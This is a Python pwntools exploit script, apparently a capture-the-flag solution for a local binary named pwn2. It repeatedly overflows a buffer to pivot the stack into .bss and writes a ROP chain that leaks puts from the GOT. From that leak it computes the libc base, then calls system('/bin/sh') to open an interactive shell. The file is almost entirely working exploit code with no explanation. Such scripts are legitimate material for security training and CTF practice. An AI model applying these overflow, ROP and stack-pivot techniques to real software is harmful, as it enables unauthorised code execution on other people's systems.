from pwn import * 
import time
# from LibcSearcher import * 
# context.log_level = 'debug'
p=process('./pwn2')
bin=ELF('./pwn2')
libc=ELF('./libc-2.31.so')
bss=bin.bss()+0x100
puts_got=bin.got['puts']
puts_plt=bin.plt['puts']
read_plt=bin.plt['read']
scanf_got=bin.got['__isoc99_scanf']
pop_rdi=0x0000000000401413 
leave_ret=0x000000000040120d
def getnum(payload):
    avg=payload[0]+payload[1]*16*16+payload[2]*16*16*16*16+payload[3]*16*16*16*16*16*16
    print(avg)
def scanf1(payload):
    avg=payload[0]+payload[1]*16*16+payload[2]*16*16*16*16+payload[3]*16*16*16*16*16*16
    p.recvuntil(b'[1] damage:\n')
    p.sendline(str(avg).encode())
def scanf2(payload):
    avg=payload[0]+payload[1]*16*16+payload[2]*16*16*16*16+payload[3]*16*16*16*16*16*16
    # print(avg)
    p.recvuntil(b'[2] damage:\n')
    p.sendline(str(avg).encode())
def PUNCH(payload):
    p.recvuntil(b'-------->-------------->-----------------> ONE PUNCH ------------>\n')
    p.send(payload)
# gdb.attach(p)
p.recvuntil(b'[*] Give me something...\n')
p.sendline(b'aaa')
p.recvuntil(b'[1] damage:\n')
p.sendline(b'2')
p.recvuntil(b'[2] damage:\n')
p.sendline(b'3')

PUNCH(b'a'*0x10+p64(scanf_got+0x8)+p64(0x000000000040128B))
time.sleep(0.1)
scanf1(p64(4198870))
time.sleep(0.1)
PUNCH(b'a'*0x10+p64(bss)+p64(0x000000000040128B))
time.sleep(0.1)
scanf1(p64(bss-0x50))
time.sleep(0.1)


PUNCH(b'a'*0x10+p64(bss+0x20)+p64(0x000000000040128B))
time.sleep(0.1)
print("bss",hex(bss))
scanf1(p64(0x00000000004011EC))
time.sleep(0.1)
PUNCH(b'a'*0x10+p64(bss+0x18)+p64(0x000000000040128B))
time.sleep(0.1)
scanf1(p64(puts_plt))
time.sleep(0.1)
PUNCH(b'a'*0x10+p64(bss+0x10)+p64(0x000000000040128B))
time.sleep(0.1)
scanf1(p64(puts_got))
time.sleep(0.1)

PUNCH(b'a'*0x10+p64(bss+0x8)+p64(0x000000000040128B))
time.sleep(0.1)
# gdb.attach(p)
scanf1(p64(pop_rdi))
time.sleep(0.1)

PUNCH(b'a'*0x10+p64(bss)+p64(0x000000000040128B))
time.sleep(0.1)
# gdb.attach(p)
scanf1(p64(bss-0x80))
time.sleep(0.1)
# gdb.attach(p)
context.log_level = 'debug'
# gdb.attach(p)
pause()
PUNCH(b'a'*0x10+p64(bss-0x10))
time.sleep(0.1)

puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
# scanf1(p64(bss-0x100))
libcbase=puts_addr-libc.symbols['puts']
print(hex(libcbase))

system_addr=libcbase+libc.symbols['system']
str_bin_sh=libcbase+libc.search(b'/bin/sh').__next__()
print("system:",hex(system_addr))
print("str_bin_sh:",hex(str_bin_sh))
PUNCH(b'a'*0x10+p64(bss-0x50+0x18)+p64(0x000000000040128B))
time.sleep(0.1)
# gdb.attach(p)
scanf1(p64(system_addr))
time.sleep(0.1)

PUNCH(b'a'*0x10+p64(bss-0x50+0x10)+p64(0x000000000040128B))
time.sleep(0.1)
# gdb.attach(p)
scanf1(p64(str_bin_sh))
time.sleep(0.1)

PUNCH(b'a'*0x10+p64(bss-0x50+0x8)+p64(0x000000000040128B))
time.sleep(0.1)
# gdb.attach(p)
scanf1(p64(pop_rdi))
time.sleep(0.1)

# PUNCH(b'a'*0x10+p64(bss+0x100)+p64(0x000000000040128B))
# time.sleep(0.1)
# # gdb.attach(p)
# scanf1(p64(bss+0x750))
# time.sleep(0.1)

pause()
PUNCH(b'a'*0x10+p64(bss-0x50-0x10)+p64(leave_ret))
time.sleep(0.1)
# print(p.recvuntil(b'-------->-------------->-----------------> ONE PUNCH ------------>\n'))


p.interactive()

